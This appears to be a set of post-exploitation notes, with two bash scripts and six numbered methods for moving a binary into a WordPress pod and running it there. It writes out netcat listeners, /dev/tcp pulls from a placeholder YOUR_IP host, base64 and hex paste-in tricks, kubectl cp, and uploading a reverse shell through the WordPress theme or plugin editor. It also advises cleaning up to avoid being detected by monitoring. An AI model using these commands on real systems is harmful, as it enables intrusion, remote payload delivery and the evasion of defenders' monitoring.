

```
#!/bin/bash

# Usage: ./transfer_file.sh <file_to_transfer> <pod_ip> [<port>]
if [ "$#" -lt 2 ]; then
  echo "Usage: $0 <file_to_transfer> <pod_ip> [<port>]"
  exit 1
fi

FILE_TO_TRANSFER=$1
POD_IP=$2
PORT=${3:-8000}

# Check if the file exists
if [ ! -f "$FILE_TO_TRANSFER" ]; then
  echo "File not found: $FILE_TO_TRANSFER"
  exit 1
fi

# Notify the user of the setup and start the listener
echo "Setting up listener on port $PORT for file transfer..."
echo "Run 'receive_file.sh' on the WordPress pod to receive the file."
nc -lvp "$PORT" < "$FILE_TO_TRANSFER"
```

##
##


```
#!/bin/bash

# Usage: ./receive_file.sh <local_machine_ip> <port> <output_filename>
if [ "$#" -lt 3 ]; then
  echo "Usage: $0 <local_machine_ip> <port> <output_filename>"
  exit 1
fi

LOCAL_MACHINE_IP=$1
PORT=$2
OUTPUT_FILE=$3

# Set up the connection and receive the file
exec 3<>/dev/tcp/$LOCAL_MACHINE_IP/$PORT
cat <&3 > "$OUTPUT_FILE"
echo "File received as $OUTPUT_FILE."
exec 3<&-  # Close input stream
exec 3>&-  # Close output stream
```




1. Base64 Encoding + Copy/Paste
Base64 encoding is a common way to convert binary data into a text format that can be easily copied and pasted between machines. Once you paste the Base64 data, you decode it back into its binary form.

Steps:

On your local machine, encode the binary (e.g., your_binary) into Base64:

```
base64 your_binary > binary.b64
```
This converts the binary file into a long string of Base64 text.

On the WordPress pod, create a new file where you can paste the Base64 string:

```
cat > binary.b64
```

After running the command, paste the Base64 content into the pod and press Ctrl+D to save the file.

Decode the Base64 file back into the original binary:

```
base64 -d binary.b64 > your_binary
chmod +x your_binary   # Make it executable
./your_binary          # Run the binary
```

Why it works: Even without network utilities (curl, wget, etc.), most shells have cat and base64 utilities. This approach works as long as the shell supports Base64 decoding.

2. echo or printf File Transfer (Hex Dumping)
Hex dumping is another way to convert binary files into text that can be easily pasted into a terminal. It works similarly to Base64 but uses hexadecimal encoding.

Steps:

On your local machine, convert the binary file into hexadecimal using xxd:

```
xxd -p your_binary > binary.hex
```

This creates a text file containing the hexadecimal representation of the binary.

On the WordPress pod, create a file to paste the hex dump into:

```
cat > binary.hex
```

Paste the hex content and save it with Ctrl+D.

Convert the hex back into a binary file:

```
xxd -r -p binary.hex your_binary
chmod +x your_binary    # Make it executable
./your_binary           # Run the binary
```

Why it works: Like Base64, xxd is often available in shells. This method is especially useful for small files since it doesn't require additional tools.

3. Script a Reverse Shell to Transfer Files
If you can establish a reverse shell, you can use it to create a file transfer connection between your local machine and the pod. A reverse shell allows the pod to connect back to a listener on your machine.

Steps:

On your local machine, set up a simple HTTP server to host the file:

```
python3 -m http.server 8000
```

This command will serve files in the current directory over HTTP on port 8000.

On the WordPress pod, use bash to connect to your local server:

```
exec 5<>/dev/tcp/YOUR_IP/8000
cat <&5 > your_binary   # Save the incoming data into your_binary
```

After the file transfer completes, make the binary executable:

```
chmod +x your_binary
./your_binary
```
Why it works: If /dev/tcp is enabled in the shell, you can establish raw TCP connections without needing curl or nc. This approach relies on creating an outbound connection to your server.

4. Use the WordPress Filesystem
Since you are working with a WordPress pod, there may be opportunities to upload files directly via the WordPress admin interface if it is accessible.

Steps:

Access the WordPress dashboard (if possible) using a browser.
Go to Appearance > Theme Editor or Plugins > Plugin Editor.
If editing is enabled, you can upload a reverse shell script or a file containing the binary data by embedding it into PHP code. For example, you could use PHP to decode a Base64 string and save it as a file on the server.
Caution: This method is potentially noisy because changes to the WordPress site could be detected by monitoring systems. Always clean up after any changes you make.

5. Leverage Kubernetes Features
If the WordPress pod is running in a Kubernetes environment and you have some access to Kubernetes features, you may be able to use kubectl to copy files directly into the pod.

Steps:

On a machine that has Kubernetes admin privileges, use kubectl cp to copy a file from your local system into the WordPress pod:

```
kubectl cp ./your_binary default/wordpress-pod:/path/to/destination
```
Then, on the pod:

```
chmod +x /path/to/destination/your_binary
/path/to/destination/your_binary
```

Why it works: If you have access to Kubernetes admin tools like kubectl, you can directly interact with the pod’s filesystem.

6. Using /dev/tcp for Transfers
Some shells support file transfers using bash built-in TCP connections through /dev/tcp/. You can use this feature to download files from your machine.

Steps:

On your local machine, start a listener that serves the binary file:

```
nc -lvp 8000 < your_binary
```
On the WordPress pod, use bash to connect to the listener and receive the file:

```
exec 3<>/dev/tcp/YOUR_IP/8000
cat <&3 > your_binary
```

Once the file is downloaded, make it executable:

```
chmod +x your_binary
./your_binary
```

Why it works: 
/dev/tcp is a lesser-known but powerful feature in bash that can be used to establish direct TCP connections without needing extra tools like nc.


# Key Considerations:
File Size: These methods work well for smaller files (typically under a few MB). For larger files, you'll need to split them into chunks or find another solution.

Security Monitoring: Some methods (e.g., modifying WordPress files or using reverse shells) can be more easily detected by security systems or leave traces. Be mindful of any cleanup you need to do afterward.

Pod Privileges: Your ability to use these methods depends on the configuration of the shell environment. For example, /dev/tcp might not be available on every shell.
